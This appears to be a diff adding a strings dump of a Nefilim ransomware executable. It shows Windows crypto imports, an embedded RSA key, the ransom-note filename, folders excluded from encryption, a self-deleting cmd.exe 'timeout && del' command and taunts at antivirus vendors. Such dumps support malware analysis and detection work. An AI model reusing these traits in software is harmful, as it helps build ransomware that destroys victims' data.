@@ -1,0 +1,502 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.reloc
+_9|$(s
+L$09|$Ds
+\$,9D$,
+L$\_^[3
+SSQPSS
+^SSSSS
+j@j ^V
+URPQQh
+;t$,v-
+UQPXY]Y[
+t"SS9] u
+PPPPPPPP
+PPPPPPPP
+QQSVWd
+t=MOC
+HtHu4j
+t*=RCC
+;7|G;p
+tR99u2
+Unknown exception
+bad allocation
+CorExitProcess
+FlsFree
+FlsSetValue
+FlsGetValue
+FlsAlloc
+ Complete Object Locator'
+ Class Hierarchy Descriptor'
+ Base Class Array'
+ Base Class Descriptor at (
+ Type Descriptor'
+`local static thread guard'
+`managed vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`vector copy constructor iterator'
+`dynamic atexit destructor for '
+`dynamic initializer for '
+`eh vector vbase copy constructor iterator'
+`eh vector copy constructor iterator'
+`managed vector destructor iterator'
+`managed vector constructor iterator'
+`placement delete[] closure'
+`placement delete closure'
+`omni callsig'
+ delete[]
+ new[]
+`local vftable constructor closure'
+`local vftable'
+`udt returning'
+`copy constructor closure'
+`eh vector vbase constructor iterator'
+`eh vector destructor iterator'
+`eh vector constructor iterator'
+`virtual displacement map'
+`vector vbase constructor iterator'
+`vector destructor iterator'
+`vector constructor iterator'
+`scalar deleting destructor'
+`default constructor closure'
+`vector deleting destructor'
+`vbase destructor'
+`string'
+`local static guard'
+`typeof'
+`vcall'
+`vbtable'
+`vftable'
+operator
+ delete
+__unaligned
+__restrict
+__ptr64
+__eabi
+__clrcall
+__fastcall
+__thiscall
+__stdcall
+__pascal
+__cdecl
+__based(
+GetProcessWindowStation
+GetUserObjectInformationW
+GetLastActivePopup
+GetActiveWindow
+MessageBoxW
+HH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
+?456789:;<=
+ !"#$%&'()*+,-./0123
+P28bYetqAjMJwFdCu5KwgN5PGwkVckpRko+dpaPjLO7ofFiQDbKw8ovNbVTREf1xBQ6glzyU76V79uTCpaWeKoTIK27f4cF8GbrTFtiCBEPGFKlFUa9xOFxA/8iU3vp7QOYlJc6pPmGT0Z/MFnQhE0CqYav+ZfHo60djvhkjRBtoPLUcpUQ5jkOczEZPbghBDMjFVM/YFb49N687qDVvrBkiWsz2ehCWS0SMxVMJi4dpMwTc3FybPQPE73FBRFUS/aAHGjcQuSxMlzvAB7CqiEVjpFUodQwjRe7vkyt30HhFnEZmjqwbGTJea2tQ4jZ6AxIekd1brjxQuiQm+gmfc8Ic8zUBwuJgqvtZ0Nq1bPcEjakY2CI5cc+S4LZUTPU6njhVyVHifOH/tSn9IrD9jX6AODDD2jrQx4iVeZ4MnziKWlmcp9/WEgfmLGhGd0kAlpyXbJgBvjIAtvkdiSfyXnWtQSpqO0aLHIoBU+zfOTAOrSoFUEIRoEGYgVLK+/m93c90kSoa7Rkg81aBOat56uFM6j+6KE8TNIXLNK0ikPR9qX104J5xlpdGPPHuzZNOkoSAgw/ZZ2/qXRyCs8GU/ZyIY0/tNXj+E6pjeaxTHiRM3d+edqcmpxWBZOJjeBtztOlYUIw5J3hquaqNH6tkfF7e0XSEBeGAo3TdSlb4U3W+jlnzB8quhIzreGJ9Vh6Z4auZkWFejxeHLKXkB0xnpep5hJzXNPuFHT/PUwCrj8NOgc+usnDxxvK2yEWYx0Q2C5IChW+jIQb9+fYF7JavseSGl/JCuj9Or1UHrOUttk8YpIRlH9waaXD5kZpI6d2oSHAsQB1zhnRbb173T7ebR9+/22ttbaAV2KfVUo1kbfsWTHkg1dqquE84FoWApIwzwKZCmiY4MBVaAv2OasHLQp5boQFLyBzJv5+IdI9Pp/+sB9v2c0ssPO2NQ3R1mdYOdAOkh0QaH+BvuMPZPyfq14K05QmahmvUN6x5z6Z8LQGK2XMC7DNvVK0kWeTu2vJi
+advapi32.dll
+SystemFunction036
+oh how i did it??? bypass sofos hah
+fuk sosorin
+fuk anlab
+invalid string position
+string too long
+rsa public
+ya chubstvuu bol' gde-to v grude, i moi rani v serdce ne zalechit'
+BgIAAACkAABSU0ExAAgAAAEAAQCXkut23nNCCp9k856QulO8Yy8x65qG+Bs8OgG4OF444bgiCofJzu1h7qo1Mn9ZdgQdW6uyC6NNcOjZz8CMBdT4LqJ09mhz4NsB56Py8dGNFpk6Ktr4lRflVpWvYHzsqJA51DfOFgvSzYTYpeXhDD0kC84FCIAivnOdciPWse7qpWoOigOizEOF3S0MiiCMAsgWrUcLo8ZT4trJv/4Drd2XBFz2dFCXk7NfiNuRiOFXS8aZ8bkyirq3yAQee5gfjPFfkbynZWjuh6UmlA/jS5vDl8WLJwTQWVr/vAuV7ziDrUQFc56tvsrV3YYlw492bQCgk62Rx4YCSfFy3jGsRsnc
+NEFILIM
+Den'gi plyvut v karmany rekoy. My khodim po krayu nozha...
+bad exception
+C:\Users\Administrator\Desktop\New folder\Release\NEFILIM.pdb
+GetSystemDefaultLangID
+FindFirstFileW
+lstrlenA
+GetDriveTypeW
+HeapAlloc
+GetCurrentProcess
+SetFilePointerEx
+HeapFree
+WaitForSingleObject
+GetLogicalDrives
+GetTickCount
+GetProcessHeap
+WriteFile
+ReadFile
+CreateFileW
+GetFileSizeEx
+GetStdHandle
+GetLastError
+SetLastError
+GetProcAddress
+MoveFileW
+FindClose
+LoadLibraryA
+lstrcmpiW
+FindNextFileW
+CloseHandle
+CreateThread
+ExitProcess
+GetModuleFileNameW
+WideCharToMultiByte
+ExitThread
+MultiByteToWideChar
+CreateMutexA
+KERNEL32.dll
+CryptReleaseContext
+CryptAcquireContextA
+CryptImportKey
+CryptEncrypt
+CryptDestroyKey
+CryptDeriveKey
+CryptCreateHash
+CryptDecrypt
+CryptHashData
+ADVAPI32.dll
+ShellExecuteW
+SHELL32.dll
+PathFindExtensionW
+PathIsDirectoryW
+SHLWAPI.dll
+GetSystemTimeAsFileTime
+EncodePointer
+DecodePointer
+GetCommandLineA
+HeapSetInformation
+RaiseException
+TerminateProcess
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+IsDebuggerPresent
+IsProcessorFeaturePresent
+HeapSize
+GetModuleHandleW
+GetModuleFileNameA
+FreeEnvironmentStringsW
+GetEnvironmentStringsW
+SetHandleCount
+InitializeCriticalSectionAndSpinCount
+GetFileType
+GetStartupInfoW
+DeleteCriticalSection
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+InterlockedIncrement
+GetCurrentThreadId
+InterlockedDecrement
+HeapCreate
+QueryPerformanceCounter
+GetCurrentProcessId
+LeaveCriticalSection
+EnterCriticalSection
+RtlUnwind
+HeapReAlloc
+LoadLibraryW
+GetCPInfo
+GetACP
+GetOEMCP
+IsValidCodePage
+LCMapStringW
+GetStringTypeW
+.?AVlogic_error@std@@
+.?AVlength_error@std@@
+.?AVout_of_range@std@@
+.?AVtype_info@@
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVexception@std@@
+.?AVbad_alloc@std@@
+.?AVbad_exception@std@@
+4.4L4Q4i4p4
+6666M6d6{6
+737J7a7x7
+9;9Y9w9
+:+:I:g:
+;T;\;b;g;l;u;{;
+;V<\<d<
+<=;=G=M=W=
+=->3>?>
+?$?.?R?W?
+1&1M1V2'4
+:.;A;I;T;Z;j;t;};
+< <+<<<X<{<
+<(=0=s=
+?!?,?1?x?
+2?2]2d2h2l2p2t2x2|2
+2B3M3h3o3t3x3|3
+4f4l4p4t4x4
+5*6\6t6{6
+7 7j7p7t7x7|7
+;#;);=;
+>0>8>C>
+0%0*000:0C0N0Z0_0o0t0z0
+1'2V2\2k2
+3a4n4t4
+5C5L5X5
+5T6\6o6z6
+7$7*7;7t7~7
+<$<?<G<M<[<
+>*?4?u?
+3S3Z3o3
+4!4E4u4
+5>5E5Q5W5c5i5r5x5
+676w6}6
+778=8S8X8`8f8m8s8z8
+9 9(9-949C9H9N9W9w9}9
+:!:-:V:^:i:x:
+<2<U<e<l<v<
+>%>1><?
+0%010h0
+1!1/14191>1N1}1
+2"2)2.2<2
+243C3Q3W3]3
+44=4Q4W4
+55'5-575=5G5M5W5`5k5p5y5
+82:C:}:
+;%;p;{;
+=7>C>V>h>
+?2?[?l?
+7D8/<A<S<e<w<
+=-=?=Q=c=u=$?x?
+10I0N0
+2$3X3k394Z5S6
+= =+=B?
+1%1/1<1N1a1t1
+t1x1|1
+2 2T2X2
+;$;,;4;<;D;L;T;\;d;l;t;|;
+3 3$3(3,3034383<3@3D3H3L3P3T3X3\3`3d3h3l3p3t3x3|3
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+0,0004080@0X0h0l0|0
+141D1H1X1\1`1h1
+2$2,20242<2P2p2
+3$3@3\3`3|3
+4 4(4<4D4X4`4d4l4t4
+405@5T5h5t5|5
+6H6P6T6l6p6
+0 0@0`0p3t3x3|3
+9 9$9(9,9094989<9@9D9H9L9P9T9X9\9`9d9h9x9|9
+;0;4;8;<;@;D;H;L;P;T;`;d;h;l;p;t;x;|;
+Western Cape1
+Durbanville1
+Thawte1
+Thawte Certification10
+Thawte Timestamping CA0
+121221000000Z
+201230235959Z0^1
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G20
+http://ocsp.thawte.com0
+.http://crl.thawte.com/ThawteTimestampingCA.crl0
+TimeStamp-2048-10
+GlobalSign nv-sa1
+Root CA1
+GlobalSign Root CA0
+110413100000Z
+280128120000Z0R1
+GlobalSign nv-sa1(0&
+GlobalSign Timestamping CA - G20
+&https://www.globalsign.com/repository/03
+"http://crl.globalsign.net/root.crl0
+AddTrust AB1&0$
+AddTrust External TTP Network1"0 
+AddTrust External CA Root0
+050607080910Z
+200530104838Z0
+Salt Lake City1
+The USERTRUST Network1!0
+http://www.usertrust.com1
+UTN-USERFirst-Object0
+3http://crl.usertrust.com/AddTrustExternalCARoot.crl05
+http://ocsp.usertrust.com0
+9f*<Z,m
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G20
+121018000000Z
+201229235959Z0b1
+Symantec Corporation1402
++Symantec Time Stamping Services Signer - G40
+http://ts-ocsp.ws.symantec.com07
++http://ts-aia.ws.symantec.com/tss-ca-g2.cer0<
++http://ts-crl.ws.symantec.com/tss-ca-g2.crl0(
+TimeStamp-2048-20
+Salt Lake City1
+The USERTRUST Network1!0
+http://www.usertrust.com1
+UTN-USERFirst-Object0
+110427000000Z
+200530104838Z0z1
+Greater Manchester1
+Salford1
+COMODO CA Limited1 0
+COMODO Time Stamping CA0
+1http://crl.usertrust.com/UTN-USERFirst-Object.crl0t
+1http://crt.usertrust.com/UTNAddTrustObject_CA.crt0%
+http://ocsp.usertrust.com0
+Arizona1
+Scottsdale1%0#
+Starfield Technologies, Inc.1200
+)Starfield Root Certificate Authority - G20
+110503070000Z
+310503070000Z0
+Arizona1
+Scottsdale1%0#
+Starfield Technologies, Inc.1301
+*http://certs.starfieldtech.com/repository/1402
++Starfield Secure Certificate Authority - G20
+hP&8=;-,
+http://ocsp.starfieldtech.com/0;
+*http://crl.starfieldtech.com/sfroot-g2.crl0L
++https://certs.starfieldtech.com/repository/0
+Greater Manchester1
+Salford1
+Sectigo Limited1$0"
+Sectigo RSA Code Signing CA0
+200306000000Z
+210306235959Z0
+Queensland1
+North Lakes1
+25 Copeland Dr1
+Inter Med Pty. Ltd.1
+Inter Med Pty. Ltd.0
+https://sectigo.com/CPS0C
+2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s
+2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#
+http://ocsp.sectigo.com0
+New Jersey1
+Jersey City1
+The USERTRUST Network1.0,
+%USERTrust RSA Certification Authority0
+181102000000Z
+301231235959Z0|1
+Greater Manchester1
+Salford1
+Sectigo Limited1$0"
+Sectigo RSA Code Signing CA0
+iemn'
+?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v
+3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%
+http://ocsp.usertrust.com0
+#jYhRB_
+mt^Ju~
+2&-jWp
+DigiCert Inc1
+www.digicert.com1$0"
+DigiCert Assured ID Root CA0
+061110000000Z
+211110000000Z0b1
+DigiCert Inc1
+www.digicert.com1!0
+DigiCert Assured ID CA-10
+.http://www.digicert.com/ssl-cps-repository.htm0
+http://ocsp.digicert.com0C
+7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0
+4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0:
+4http://crl4.digicert.com/DigiCertAssuredIDRootCA.crl0
+Greater Manchester1
+Salford1
+Sectigo Limited1$0"
+Sectigo RSA Code Signing CA
+Symantec Corporation100.
+'Symantec Time Stamping Services CA - G2
+200313085858Z0#
+El7c0N
+mscoree.dll
+runtime error 
+TLOSS error
+SING error
+DOMAIN error
+- Attempt to use MSIL code from this assembly during native code initialization
+This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native constructor or from DllMain.
+- not enough space for locale information
+- Attempt to initialize the CRT more than once.
+This indicates a bug in your application.
+- CRT not initialized
+- unable to initialize heap
+- not enough space for lowio initialization
+- not enough space for stdio initialization
+- pure virtual function call
+- not enough space for _onexit/atexit table
+- unable to open console device
+- unexpected heap error
+- unexpected multithread lock error
+- not enough space for thread data
+- abort() has been called
+- not enough space for environment
+- not enough space for arguments
+- floating point support not loaded
+@Microsoft Visual C++ Runtime Library
+<program name unknown>
+Runtime Error!
+Program: 
+KERNEL32.DLL
+WUSER32.DLL
+HH:mm:ss
+dddd, MMMM dd, yyyy
+MM/dd/yy
+December
+November
+October
+September
+August
+February
+January
+Saturday
+Friday
+Thursday
+Wednesday
+Tuesday
+Monday
+Sunday
+         (((((                  H
+         h((((                  H
+                                 H
+6NEFILIM
+NEFILIM-DECRYPT.txt
+windows
+$RECYCLE.BIN
+NTDETECT.COM
+MSDOS.SYS
+IO.SYS
+boot.ini
+AUTOEXEC.BAT
+ntuser.dat
+desktop.ini
+CONFIG.SYS
+RECYCLER
+BOOTSECT.BAK
+bootmgr
+programdata
+appdata
+program files
+program files (x86)
+microsoft
+sophos
+.NEFILIM
+hhow to fuck all the world?
+" /s /f /q
+ /c timeout /t 3 /nobreak && del "
+cmd.exe
+RAny use of this Certificate constitutes acceptance of the DigiCert CP/CPS and the Relying Party Agreement which limit liability and are incorporated herein by reference
